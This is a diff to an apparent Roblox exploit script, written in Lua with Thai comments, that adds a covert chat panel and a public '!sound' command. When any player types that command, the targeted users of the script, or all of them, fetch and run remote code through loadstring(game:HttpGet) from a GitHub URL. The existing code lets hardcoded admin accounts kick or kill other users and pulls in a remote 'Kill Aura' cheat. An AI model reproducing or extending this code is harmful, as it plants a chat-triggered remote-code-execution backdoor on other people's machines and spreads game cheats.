@@ -5,6 +5,7 @@ local Camera = workspace.CurrentCamera
 local MyName = Player.Name
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- [Logics] ระบบสิทธิ์การใช้งาน
 _G.VIP_LIST = _G.VIP_LIST or {
@@ -15,7 +16,7 @@ _G.VIP_LIST = _G.VIP_LIST or {
 local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
 local GIFTED_LIST = {} 
 local HAS_COMMAND_POWER = {}
-local ACTIVE_USERS = {} -- เก็บรายชื่อคนที่รันสคริปต์ในเซิร์ฟนี้
+local ACTIVE_USERS = {}
 
 -- [Start Logic] ฟังก์ชันสำหรับเล่นเสียง UI
 local function PlayUISound(id)
@@ -172,9 +173,9 @@ AdminTitle.TextColor3 = Color3.fromRGB(255, 50, 50); AdminTitle.BackgroundTransp
 AdminTitle.Font = Enum.Font.FredokaOne; AdminTitle.TextSize = 14
 
 local HelpList = Instance.new("TextLabel", AdminPanel)
-HelpList.Size = UDim2.new(0.9, 0, 0, 60); HelpList.Position = UDim2.new(0.05, 0, 0.12, 0)
+HelpList.Size = UDim2.new(0.9, 0, 0, 70); HelpList.Position = UDim2.new(0.05, 0, 0.12, 0)
 HelpList.BackgroundTransparency = 1; HelpList.TextColor3 = Color3.fromRGB(200, 200, 200)
-HelpList.Text = "!kill [name] | !kick [name] | !tp [name]\n!freeze [name] | !unfreeze [name]\n!givevip [name] | !killall | !kickall"
+HelpList.Text = "!kill [name] | !kick [name] | !tp [name]\n!freeze [name] | !unfreeze [name]\n!givevip [name] | !killall | !kickall\n!sound [name] (Public)"
 HelpList.Font = Enum.Font.SourceSansBold; HelpList.TextSize = 12
 
 KickTextInp = Instance.new("TextBox", AdminPanel)
@@ -206,6 +207,57 @@ local Scroll = Instance.new("ScrollingFrame", Board)
 Scroll.Size = UDim2.new(1, -10, 1, -55); Scroll.Position = UDim2.new(0, 5, 0, 45)
 Scroll.BackgroundTransparency = 1; Scroll.ScrollBarThickness = 2
 
+-- [[ PRIVATE CHAT SYSTEM ]]
+local ChatFrame = Instance.new("Frame", MainGui)
+ChatFrame.Size = UDim2.new(0, 280, 0, 220); ChatFrame.Position = UDim2.new(0.05, 0, 0.65, 0)
+ChatFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15); ChatFrame.BackgroundTransparency = 0.2; ChatFrame.Visible = false
+ApplyNeonEffect(ChatFrame, Color3.fromRGB(0, 255, 255)); MakeDraggable(ChatFrame); AddBackgroundEffect(ChatFrame)
+
+local ChatTitle = Instance.new("TextLabel", ChatFrame)
+ChatTitle.Size = UDim2.new(1, 0, 0, 25); ChatTitle.Text = "Private Chat (Active Users Only)"; ChatTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
+ChatTitle.BackgroundTransparency = 1; ChatTitle.Font = Enum.Font.FredokaOne; ChatTitle.TextSize = 10
+
+local ChatScroll = Instance.new("ScrollingFrame", ChatFrame)
+ChatScroll.Size = UDim2.new(1, -10, 1, -70); ChatScroll.Position = UDim2.new(0, 5, 0, 30)
+ChatScroll.BackgroundTransparency = 0.9; ChatScroll.ScrollBarThickness = 2; ChatScroll.CanvasSize = UDim2.new(0,0,0,0)
+local ChatList = Instance.new("UIListLayout", ChatScroll)
+ChatList.Padding = UDim.new(0, 2); ChatList.SortOrder = Enum.SortOrder.LayoutOrder
+
+local ChatInput = Instance.new("TextBox", ChatFrame)
+ChatInput.Size = UDim2.new(1, -10, 0, 30); ChatInput.Position = UDim2.new(0, 5, 1, -35)
+ChatInput.BackgroundColor3 = Color3.fromRGB(20, 20, 30); ChatInput.TextColor3 = Color3.new(1, 1, 1)
+ChatInput.PlaceholderText = "Type message here..."; ChatInput.Text = ""; Instance.new("UICorner", ChatInput)
+
+local function AddChatMessage(senderName, msgText, color)
+    local l = Instance.new("TextLabel", ChatScroll)
+    l.Size = UDim2.new(1, -10, 0, 20); l.BackgroundTransparency = 1
+    l.Text = "[" .. senderName .. "]: " .. msgText
+    l.TextColor3 = color or Color3.new(1, 1, 1)
+    l.Font = Enum.Font.SourceSansBold; l.TextSize = 14; l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextWrapped = true; l.AutomaticSize = Enum.AutomaticSize.Y
+    
+    task.wait(0.05)
+    ChatScroll.CanvasSize = UDim2.new(0, 0, 0, ChatList.AbsoluteContentSize.Y)
+    ChatScroll.CanvasPosition = Vector2.new(0, ChatList.AbsoluteContentSize.Y)
+end
+
+local function GetChatColor(name)
+    if ADMIN_COMMANDER[name] then return Color3.fromRGB(255, 50, 50) end
+    if _G.VIP_LIST[name] then return Color3.fromRGB(255, 215, 0) end
+    return Color3.fromRGB(100, 255, 255)
+end
+
+ChatInput.FocusLost:Connect(function(enter)
+    if enter and ChatInput.Text ~= "" then
+        local myMsg = ChatInput.Text
+        AddChatMessage(MyName, myMsg, GetChatColor(MyName))
+        local fullMsg = "[SW_CHAT]" .. myMsg
+        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvent then chatEvent.SayMessageRequest:FireServer(fullMsg, "All") end
+        ChatInput.Text = ""
+    end
+end)
+
 local function CreateBtn(txt, pos, color)
     local b = Instance.new("TextButton", MainGui)
     b.Size = UDim2.new(0, 48, 0, 48); b.Position = pos; b.Text = txt
@@ -218,11 +270,16 @@ local function CreateBtn(txt, pos, color)
     MakeDraggable(b); return b
 end
 
-local MinBoardBtn = CreateBtn("📜", UDim2.new(0.85, -50, 0.3, 0), Color3.fromRGB(0, 120, 255))
+-- [[ ปรับตำแหน่งการจัดเรียงปุ่ม UI ใหม่ให้เป็นระเบียบ ]]
+local MinBoardBtn = CreateBtn("📜", UDim2.new(0.95, -50, 0.3, 0), Color3.fromRGB(0, 120, 255))
 MinBoardBtn.MouseButton1Click:Connect(function() Board.Visible = not Board.Visible end)
-local MinAdminBtn = CreateBtn("🛡", UDim2.new(0.5, -180, 0.5, -125), Color3.fromRGB(255, 0, 0))
+
+local MinAdminBtn = CreateBtn("🛡", UDim2.new(0.95, -50, 0.3, 60), Color3.fromRGB(255, 0, 0))
 MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil)
 MinAdminBtn.MouseButton1Click:Connect(function() AdminPanel.Visible = not AdminPanel.Visible end)
+
+local MinChatBtn = CreateBtn("💬", UDim2.new(0.95, -50, 0.3, 120), Color3.fromRGB(0, 200, 200))
+MinChatBtn.MouseButton1Click:Connect(function() ChatFrame.Visible = not ChatFrame.Visible end)
 
 local function UpdateBoard()
     for _, v in pairs(Scroll:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
@@ -245,45 +302,57 @@ end
 task.spawn(function() while task.wait(3) do UpdateBoard() end end)
 
 local function ListenChat(speaker, msg)
+    local args = msg:split(" ")
+    local cmd = args[1]:lower()
+
+    local function findTarget(name)
+        if name == "me" or name == "all" then return name end
+        for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
+        return nil
+    end
+    local target = args[2] and findTarget(args[2])
+
+    -- [COMMAND !sound] ทุกคนใช้ได้ และขึ้นเฉพาะคนที่ถูกระบุ
+    if cmd == "!sound" and target then
+        if (target == "me" and speaker == Player) or (typeof(target) == "Instance" and target == Player) or (target == "all") then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/%E0%B8%82%E0%B9%82%E0%B8%A1%E0%B8%A2%E0%B9%80%E0%B8%AA%E0%B8%B5%E0%B8%A2%E0%B8%87"))()
+        end
+        return
+    end
+
     if msg == "[ScriptWord_Ping]" then
         ACTIVE_USERS[speaker.Name] = true
         UpdateBoard()
         return
     end
 
-    local args = msg:split(" ")
-    local cmd = args[1]:lower()
-    local function findTarget(name)
-        for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
-        return nil
+    if msg:sub(1, 9) == "[SW_CHAT]" then
+        if speaker.Name ~= MyName then
+            local realMsg = msg:sub(10)
+            AddChatMessage(speaker.Name, realMsg, GetChatColor(speaker.Name))
+        end
+        return
     end
-    local target = args[2] and findTarget(args[2])
 
-    -- [จุดแก้ไข] เช็คสิทธิ์: เป็น Admin หรือ เป็นคนที่มี VIP อยู่แล้ว หรือมีสิทธิ์ CMD
     local hasAnyPower = ADMIN_COMMANDER[speaker.Name] or _G.VIP_LIST[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
 
     if hasAnyPower then
         if speaker ~= Player then PlayUISound(203785501) end
         
-        -- สิทธิ์การ Give VIP (Admin และ VIP สามารถให้ได้)
         if cmd == "!givevip" and target == Player then
-            GIFTED_LIST[Player.Name] = speaker.Name -- บันทึกว่าโดนกิ้ฟโดยใคร
+            GIFTED_LIST[Player.Name] = speaker.Name 
             UpdateBoard()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
         end
         
-        -- เฉพาะ Admin เท่านั้นที่ให้สิทธิ์ CMD (สิทธิ์รันแผงควบคุม)
         if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then
             HAS_COMMAND_POWER[Player.Name] = true
             AdminPanel.Visible = true; MinAdminBtn.Visible = true
             UpdateBoard()
         end
 
-        -- [หัวใจสำคัญ] ถ้า "เรา" คือคนที่โดนกิ้ฟ และคนสั่งคือ "คนที่กิ้ฟให้เรา" หรือเป็น Admin หรือคนที่มีสิทธิ์ CMD
         if target == Player then
-            -- เช็คว่าคนสั่งคือคนที่กิ้ฟให้เราใช่ไหม หรือคนสั่งมีสิทธิ์ CMD
             local isMyGiver = (GIFTED_LIST[Player.Name] == speaker.Name)
-            
             if ADMIN_COMMANDER[speaker.Name] or isMyGiver or HAS_COMMAND_POWER[speaker.Name] then
                 if cmd == "!kick" then CustomKick()
                 elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
@@ -293,7 +362,6 @@ local function ListenChat(speaker, msg)
             end
         end
 
-        -- คำสั่งหมู่ (Admin และ คนที่มีสิทธิ์ CMD สามารถใช้ได้)
         if ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] then
             if cmd == "!killall" then 
                 if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
@@ -304,10 +372,14 @@ local function ListenChat(speaker, msg)
     end
 end
 
+-- ทำให้คนรันสคริปต์ทุกคนขึ้นบอร์ด
+ACTIVE_USERS[MyName] = true 
 task.spawn(function()
     task.wait(2)
-    local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-    if chatEvent then chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") end
+    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if chatEvent then 
+        chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") 
+    end
 end)
 
 CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
